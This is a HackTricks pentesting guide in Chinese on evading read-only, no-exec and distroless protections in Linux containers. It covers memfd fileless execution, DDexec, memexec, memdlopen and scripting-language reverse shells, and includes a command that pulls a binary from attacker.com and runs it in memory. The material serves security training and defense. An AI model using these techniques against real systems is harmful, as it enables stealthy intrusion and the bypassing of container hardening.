# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## 视频

以下视频对本页面提到的技术进行了更深入的讲解：

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec 场景

在 linux 机器上发现挂载了 **read-only (ro) 文件系统保护** 的情况越来越普遍，尤其是在容器中。这是因为只需在 `securitycontext` 中设置 **`readOnlyRootFilesystem: true`**，就可以轻松地以 ro 文件系统运行容器：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统以 ro 方式挂载，**`/dev/shm`** 仍然是可写的，因此认为我们无法在磁盘中写入任何内容是错误的。不过，该目录会以 **no-exec 保护** 方式挂载，因此如果你在这里下载一个 binary，你将**无法执行它**。

> [!WARNING]
> 从 red team 的角度来看，这会使**下载并执行**系统中原本不存在的 binary（例如 backdoor 或 `kubectl` 之类的 enumerator）变得**复杂**。

## 最简单的 bypass：Scripts

注意，我提到的是 binary。只要解释器位于机器中，你就可以**执行任何 script**，例如在存在 `sh` 时执行 **shell script**，或者在安装了 `python` 时执行 **python** **script**。

不过，仅这样还不足以执行你的 binary backdoor，或运行你可能需要的其他 binary tools。

## Memory Bypasses

如果你想执行一个 binary，但文件系统不允许这样做，最佳方式是**从 memory 中执行它**，因为这些**保护不会在其中生效**。

### FD + exec syscall bypass

如果机器中有一些功能强大的 script engines，例如 **Python**、**Perl** 或 **Ruby**，你可以将要执行的 binary 下载到 memory 中，将其存储在一个 memory file descriptor（`create_memfd` syscall）中。该 descriptor 不会受到这些保护，然后调用一个 **`exec` syscall**，指定 **fd 作为要执行的文件**。

你可以轻松使用 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 项目完成此操作。你可以向它传入一个 binary，它会使用指定的语言生成一个 script，其中包含经过 **compressed and b64 encoded** 的 **binary**，以及将其**decode and decompress** 到通过调用 `create_memfd` syscall 创建的 **fd** 中的指令，最后调用 **exec** syscall 来运行它。

> [!WARNING]
> 这对 PHP 或 Node 等其他 scripting languages 不适用，因为它们没有**调用 raw syscalls 的默认方式**，因此无法调用 `create_memfd` 来创建用于存储 binary 的 **memory fd**。
>
> 此外，在 `/dev/shm` 中创建包含文件的**普通 fd** 也不起作用，因为你无法运行它，**no-exec protection** 会生效。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 是一种通过覆盖进程自身的 **`/proc/self/mem`** 来**修改自身进程 memory** 的技术。

因此，通过**控制进程正在执行的 assembly code**，你可以写入一个 **shellcode**，并使进程“变异”为**执行任意代码**。

> [!TIP]
> **DDexec / EverythingExec** 将允许你从 **memory** 中加载并**执行**自己的 **shellcode** 或**任意 binary**。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
如需了解有关此 technique 的更多信息，请查看 Github 或：


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的自然下一步。它是一个被**守护化的 DDexec shellcode**，因此每当你想要**运行不同的 binary**时，不需要重新启动 DDexec；你只需通过 DDexec technique 运行 memexec shellcode，然后与这个 **daemon** 通信，以传递要加载并运行的新 binary。

你可以在 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) 中找到如何使用 **memexec 从 PHP reverse shell 执行 binary** 的示例。

### Memdlopen

与 DDexec 用途类似，[**memdlopen**](https://github.com/arget13/memdlopen) technique 提供了一种更简单的方式，可以将 **binary 加载到内存中**，以便之后执行。它甚至可以加载带有依赖项的 binary。

## Distroless Bypass

如需专门了解 **distroless 的实际含义**、它何时有帮助、何时没有帮助，以及它如何改变容器中的 post-exploitation tradecraft，请查看：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### 什么是 distroless

Distroless 容器只包含**运行特定 application 或 service 所必需的最低限度组件**，例如 libraries 和 runtime dependencies，但会排除 package manager、shell 或 system utilities 等较大的组件。

Distroless 容器的目标是**通过移除不必要的组件来减少容器的 attack surface**，并尽量减少可被利用的 vulnerabilities 数量。

### Reverse Shell

在 distroless 容器中，你**甚至可能找不到 `sh` 或 `bash`** 来获取常规 shell。你也不会找到 `ls`、`whoami`、`id` 等 binary……也就是你通常在 system 中运行的所有工具。

> [!WARNING]
> 因此，你将**无法**像通常那样获取 **reverse shell** 或对 system 进行 **enumerate**。

不过，如果被 compromise 的容器运行的是例如 flask web application，那么其中安装了 Python，因此你可以获取一个 **Python reverse shell**。如果运行的是 node，则可以获取 Node rev shell；对于大多数 **scripting language** 也是如此。

> [!TIP]
> 你可以使用该 scripting language 的 capabilities 来**enumerate system**。

如果没有 **`read-only/no-exec`** protections，你可以利用 reverse shell 将 binary **写入 file system** 并**执行**它们。

> [!TIP]
> 但是，在这类容器中通常会存在这些 protections；你可以使用**之前介绍的 memory execution techniques 来绕过它们**。

你可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到如何利用一些 **RCE vulnerabilities** 获取 scripting language **reverse shell**，并从内存中执行 binary 的**示例**。


{{#include ../../../../banners/hacktricks-training.md}}
